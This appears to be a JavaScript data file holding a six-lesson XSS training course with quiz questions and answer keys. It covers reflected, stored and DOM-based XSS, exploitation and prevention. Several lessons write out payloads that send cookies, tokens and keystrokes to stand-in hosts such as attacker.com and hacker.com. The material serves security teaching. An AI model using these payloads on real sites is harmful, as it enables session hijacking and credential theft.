const LESSONS = [
  {
    title: "Introduction to XSS & Why It's Dangerous",
    points: 10,
    content: `Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious client-side executable code (usually JavaScript) into a trusted website.

WHAT HAPPENS?
When a victim visits the infected web page, their browser executes the malicious script. The browser has no way of knowing the script is untrusted and assumes it legitimately belongs to the website.

WHY IS IT DANGEROUS?
Unlike SQL Injection (which targets the backend database), XSS targets the user (the frontend). Because the malicious script executes within the context of the user's session, it can:
- Read any data the user has access to.
- Perform actions on behalf of the user.
- Modify the webpage's appearance (Defacement).
- Capture keystrokes (Keylogging) to steal passwords.

HOW DO ATTACKERS EXPLOIT USER INPUT?
XSS typically occurs when an application takes user input and includes it in a web page without proper validation or output encoding. 

Example:
If a search page outputs: You searched for: USER_INPUT
An attacker types: <script>alert('Hacked')</script>
The page outputs: You searched for: <script>alert('Hacked')</script>
The browser executes the alert box.`,
    questions: [
      { q: "What does XSS stand for?", a: "Cross-Site Scripting" },
      { q: "Unlike SQL Injection, which targets the database, what does XSS primarily target?", a: "The user" },
      { q: "What language is most commonly injected in an XSS attack?", a: "JavaScript" },
      { q: "What happens when the victim's browser sees an injected &lt;script&gt; tag?", a: "It executes the script" }
    ]
  },
  {
    title: "Reflected XSS",
    points: 10,
    content: `Reflected XSS (or Non-Persistent XSS) is the most common type. The malicious payload is carried in the HTTP request (like a URL parameter) and is immediately "reflected" back by the server in the HTTP response.

HOW IT WORKS:
1. Attacker crafts a malicious link containing the XSS payload.
   Example: http://bank.com/search?q=<script>steal()</script>
2. Attacker tricks a victim into clicking the link (via phishing email or malicious site).
3. The victim's browser sends the request to the bank server.
4. The bank server processes the request and sends back HTML containing the payload.
5. The victim's browser executes the script.

PRACTICAL SCENARIO:
You receive an email claiming you won a prize with a link:
http://trusted-site.com/welcome?name=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

Because the site blindly reflects the "name" parameter, clicking the link immediately sends your session cookie to the attacker.`,
    questions: [
      { q: "In Reflected XSS, where is the malicious payload typically carried?", a: "In the HTTP request (or URL)" },
      { q: "How does the attacker usually deliver a Reflected XSS attack to a victim?", a: "By tricking them into clicking a malicious link" },
      { q: "Is Reflected XSS persistent on the server database?", a: "No" }
    ]
  },
  {
    title: "Stored XSS",
    points: 10,
    content: `Stored XSS (or Persistent XSS) is much more dangerous than Reflected XSS because the payload is permanently saved on the target server.

HOW IT WORKS:
1. The attacker submits malicious input to the website (e.g., leaving a comment on a blog, updating a user profile, or posting in a forum).
2. The server stores this input in its database.
3. Later, when victims navigate to the affected page, the server retrieves the stored payload and includes it in the HTML response.
4. The victim's browser executes the script without the victim ever clicking a suspicious link.

PRACTICAL SCENARIO:
An attacker leaves a review on an e-commerce site:
"Great product! <script>fetch('http://attacker.com/log?user='+localStorage.token)</script>"

Every single customer who views that product page will automatically have their authentication token sent to the attacker in the background. No social engineering is required beyond getting victims to visit the normal product page.`,
    questions: [
      { q: "Where is the payload saved in a Stored XSS attack?", a: "On the server (or database)" },
      { q: "Why is Stored XSS considered more dangerous than Reflected XSS?", a: "It affects any user who visits the infected page without clicking a malicious link" },
      { q: "If an attacker puts a script in their user profile bio, what type of XSS is this?", a: "Stored XSS" }
    ]
  },
  {
    title: "DOM-Based XSS",
    points: 10,
    content: `DOM-Based XSS happens entirely on the client side (in the browser). The vulnerability is in the page's legitimate JavaScript, not the server-side code.

THE DOM (Document Object Model):
The DOM is a structural representation of the HTML document. Browsers use the DOM to render the page, and JavaScript can manipulate the DOM dynamically.

HOW IT WORKS:
In DOM XSS, the legitimate JavaScript on the page takes data from an attacker-controllable "Source" and passes it to a dangerous "Sink" without proper sanitization.

- Source: Where data enters (e.g., window.location.hash, document.URL).
- Sink: Where data is executed (e.g., eval(), document.write(), innerHTML).

PRACTICAL SCENARIO:
A website uses the URL hash to display language preferences:
URL: http://site.com/page.html#English
JS Code: document.getElementById('lang').innerHTML = window.location.hash.substring(1);

If the attacker crafts a link: http://site.com/page.html#<img src=x onerror=alert(1)>
The server never sees the hash fragment. The local JavaScript grabs it and blindly inserts it via innerHTML, triggering the XSS.`,
    questions: [
      { q: "Where does the vulnerability exist in DOM-Based XSS?", a: "In the client-side JavaScript" },
      { q: "In DOM XSS terminology, what is the location where data enters the script called?", a: "Source" },
      { q: "What is an example of a dangerous Sink in JavaScript?", a: "innerHTML (or eval(), document.write())" },
      { q: "Does the server necessarily see the malicious payload in a DOM XSS attack using URL hashes?", a: "No" }
    ]
  },
  {
    title: "Exploitation: Cookie Theft, Hijacking & Phishing",
    points: 10,
    content: `Once an XSS vulnerability is found, attackers use various payloads to achieve their goals.

1. COOKIE THEFT & SESSION HIJACKING
If a website stores session IDs in accessible cookies, an attacker can steal them.
Payload: <script>new Image().src="http://attacker.com/steal.php?c=" + document.cookie;</script>
The attacker then replaces their own session cookie with the victim's, instantly gaining access to the victim's account without a password.

2. PHISHING (Credential Harvesting)
Attackers can use XSS to rewrite the DOM, injecting fake login forms over the real page.
Because the URL still says "trusted-bank.com", victims trust the fake login form and enter their credentials, which are sent straight to the attacker.

3. MALICIOUS ACTIONS ON BEHALF OF THE USER
The script can perform HTTP requests using the victim's authenticated session.
For example, if you are logged into Twitter and view a stored XSS payload, the script can secretly force your account to Retweet the attacker's content or change your password.

4. KEYLOGGING
Injecting an event listener to capture every keystroke typed on the page:
document.addEventListener('keypress', function(e) { fetch('http://hacker.com/log?k=' + e.key); });`,
    questions: [
      { q: "What Javascript property allows reading the user's cookies?", a: "document.cookie" },
      { q: "Taking over a user's account by stealing their active session token is called what?", a: "Session Hijacking" },
      { q: "How can XSS be used to perform Phishing on a legitimate domain?", a: "By injecting a fake login form" },
      { q: "What technique captures what a user types on a compromised page?", a: "Keylogging" }
    ]
  },
  {
    title: "Prevention & Security Testing Tools",
    points: 10,
    content: `Defending against XSS requires a defense-in-depth approach.

PREVENTION TECHNIQUES:
1. Output Encoding: Before displaying user input, encode it. Convert dangerous characters into safe HTML entities. 
   < becomes &lt;
   > becomes &gt;
   " becomes &quot;
   If the browser sees &lt;script&gt;, it displays the text literally rather than executing it.
2. Input Validation: Only accept expected input (e.g., validate that an age is a number, not text).
3. Content Security Policy (CSP): An HTTP header that restricts which scripts the browser is allowed to load and execute. A strong CSP will block inline scripts and unauthorized external scripts.
4. HttpOnly Cookies: Flagging session cookies as HttpOnly prevents JavaScript from reading them via document.cookie.

SECURITY TESTING TOOLS:
- Browser Developer Tools: Used to inspect the DOM, view network requests, and debug JavaScript to find DOM XSS.
- Burp Suite: The Repeater and Intruder modules are used to inject various XSS payloads into parameters and analyze the server's HTML response to see if they are reflected securely.
- Automated Scanners: Tools like OWASP ZAP or Acunetix can crawl apps and fuzz parameters for XSS flaws.`,
    questions: [
      { q: "What defense mechanism converts dangerous characters like &lt; into safe HTML entities?", a: "Output Encoding" },
      { q: "What HTTP header restricts which scripts are allowed to execute?", a: "Content Security Policy (or CSP)" },
      { q: "What cookie flag prevents Javascript from stealing session tokens?", a: "HttpOnly" },
      { q: "What tool uses Repeater and Intruder to test for reflected XSS?", a: "Burp Suite" }
    ]
  }
];
